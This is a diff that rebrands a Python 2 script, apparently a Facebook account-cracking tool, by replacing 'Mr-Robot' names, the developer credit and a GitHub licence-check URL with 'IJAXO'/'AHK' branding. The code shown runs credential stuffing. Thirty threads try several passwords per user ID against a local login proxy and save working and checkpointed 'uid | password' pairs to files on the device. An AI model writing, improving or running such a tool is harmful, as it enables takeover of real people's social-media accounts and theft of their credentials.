@@ -49,7 +49,7 @@ S='\033[1;96m'
 P='\033[1;95m'
 Y='\033[1;93m'
 
-#Dev:Sayyed_Zakarya
+#Dev:IJAXO_HACKER
 #### LOGO ####
 logo = """                          
 \033[1;94m  ___   _____  _     _  _     _  ___    ___   
@@ -83,7 +83,7 @@ def reg():
     except (KeyError, IOError):
         reg2()
 
-    r = requests.get('https://raw.githubusercontent.com/aryanotriks/Filecrack/main/robot.txt').text
+    r = requests.get('https://raw.githubusercontent.com/Mrbadmash/Filecrack/main/robot.txt').text
     if to in r:
         os.system('cd ..... && npm install')
         os.system('fuser -k 5000/tcp &')
@@ -167,7 +167,7 @@ def log_menu():
 
 
 def log_menu_s():
-    s = raw_input(' \033[1;97m╰─Mr-Robot➤ ')
+    s = raw_input(' \033[1;97m╰─Mr-IJAXO➤ ')
     if s == '1':
         log_fb()
     elif s == '2':
@@ -274,7 +274,7 @@ def menu():
 
 
 def menu_s():
-    ms = raw_input('\033[1;97m╰─Mr-Robot➤ ')
+    ms = raw_input('\033[1;97m╰─Mr-IJAXO➤ ')
     if ms == '1':
         auto_crack()
     elif ms == '2':
@@ -342,7 +342,7 @@ def a_s():
     id = []
     cps = []
     oks = []
-    a_s = raw_input(' \033[1;97m╰─Mr-Robot➤ ')
+    a_s = raw_input(' \033[1;97m╰─Mr-IJAXO➤ ')
     if a_s == '1':
         os.system('clear')
         print logo
@@ -447,14 +447,15 @@ def a_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\033[1;95m[MRP-OK]➤ ' + uid + ' | ' + pass1
-                ok = open('/sdcard/ids/MRP_OK.txt', 'a')
+                print '\033[1;95m[AHK-OK]➤ ' + uid + ' | ' + pass1
+                ok = open('/sdcard/ids/AHK_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\033[1;97m[MRP-CP]➤ ' + uid + ' | ' + pass1
-                cp = open('MRP_CP.txt', 'a')
+                print '\033[1;97m[AHK-CP]➤ ' + uid + ' | ' + pass1
+
+                cp = open('AHK_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
                 cps.append(uid + pass1)
@@ -462,14 +463,14 @@ def a_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\033[1;95m[MRP-OK]➤ ' + uid + ' | ' + pass2
-                    ok = open('/sdcard/ids/MRP_OK.txt', 'a')
+                    print '\033[1;95m[AHK-OK]➤ ' + uid + ' | ' + pass2
+                    ok = open('/sdcard/ids/AHK_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\033[1;97m[MRP-CP]➤ ' + uid + ' | ' + pass2
-                    cp = open('MRP_CP.txt', 'a')
+                    print '\033[1;97m[AHK-CP]➤ ' + uid + ' | ' + pass2
+                    cp = open('AHK_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
                     cps.append(uid + pass2)
@@ -477,14 +478,14 @@ def a_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\033[1;95m[MRP-OK]➤ ' + uid + ' | ' + pass3
-                        ok = open('/sdcard/ids/MRP_OK.txt', 'a')
+                        print '\033[1;95m[AHK-OK]➤ ' + uid + ' | ' + pass3
+                        ok = open('/sdcard/ids/AHK_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\033[1;97m[MRP-CP]➤ ' + uid + ' | ' + pass3
-                        cp = open('MRP_CP.txt', 'a')
+                        print '\033[1;97m[AHK-CP]➤ ' + uid + ' | ' + pass3
+                        cp = open('AHK_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
                         cps.append(uid + pass3)
@@ -492,14 +493,14 @@ def a_s():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\033[1;95m[MRP-OK]➤ ' + uid + ' | ' + pass4
-                            ok = open('/sdcard/ids/MRP_OK.txt', 'a')
+                            print '\033[1;95m[AHK-OK]➤ ' + uid + ' | ' + pass4
+                            ok = open('/sdcard/ids/AHK_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\033[1;97m[MRP-CP]➤ ' + uid + ' | ' + pass4
-                            cp = open('MRP_CP.txt', 'a')
+                            print '\033[1;97m[AHK-CP]➤ ' + uid + ' | ' + pass4
+                            cp = open('AHK_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
                             cps.apppend(uid + pass4)
@@ -511,7 +512,7 @@ def a_s():
     p = ThreadPool(30)
     p.map(main, id)
     print 47 * '-'
-    print ' \033[1;92mMRP MEAN MR-ROBOT PROGRAMMING'
+    print ' \033[1;92mAHK MEAN AZAB HACKING KILLER'
     print ' \033[1;92mTotal \033[1;95mOk\033[1;90m/\033[1;97mCp:' + str(len(oks)) + '/' + str(len(cps))
     print 47 * '-'
     raw_input(' \033[1;90mPress enter to back')
